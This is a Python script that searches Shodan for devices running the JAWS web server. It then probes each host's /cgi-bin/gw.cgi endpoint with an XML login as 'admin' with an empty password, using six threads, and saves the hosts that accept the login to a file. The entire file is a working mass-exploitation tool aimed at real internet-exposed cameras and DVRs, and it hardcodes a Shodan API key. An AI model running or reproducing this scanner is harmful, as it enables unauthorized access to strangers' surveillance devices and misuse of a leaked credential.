import shodan
import requests
from queue import Queue
from threading import Thread
import time
import re



def collecturl(urlQueue):
    API_KEY = 'dEJ60w8UwciXwFimX8PQ6Xd9p7RA2CzD'
    api = shodan.Shodan(API_KEY)

    try:
        # 搜索 Shodan
        results = api.search('JAWS')
        # 显示结果
        print('Results found: %s' % results['total'])
        for result in results['matches']:
                url = result['ip_str'] + ":"+ str(result["port"])
                urlQueue.put(url)
                print(url)
    except shodan.APIError as e:
        print('Error: %s' % e)


class testLogin(Thread):

    def __init__(self, urlQueue, enableQueue):
        super(testLogin, self).__init__()
        self.urlQueue = urlQueue
        self.enableQueue = enableQueue

    def run(self):
        while True:
            try:
                url = self.urlQueue.get(False)
                fullurl = url + "/cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=" + str(int(time.time()*1000))
                res = requests.get(fullurl)
                str = res.text
                result = re.search(r'<rpermission errno="(\d)"', str)
                if (result.group(1) == '0'):
                    self.enableQueue.put(url)
                    print("ok")
            except:
                print("err")
                break

def write(enableQueue):
    with open("reuslt.txt", 'w') as f:
        while True:
            try:
                url = enableQueue.get(False)
                f.write(url+"\n")
            except:
                break



def main():

    urlQueue = Queue()
    enableQueue = Queue()

    collecturl(urlQueue)

    testList = []
    for threadname in range(6):
        thread = testLogin(urlQueue, enableQueue)
        thread.start()
        testList.append(thread)

    while not enableQueue.empty():
        pass

    for thread in testList:
        thread.join()

    print("------start write------")
    write(enableQueue)

if __name__ == "__main__":
    main()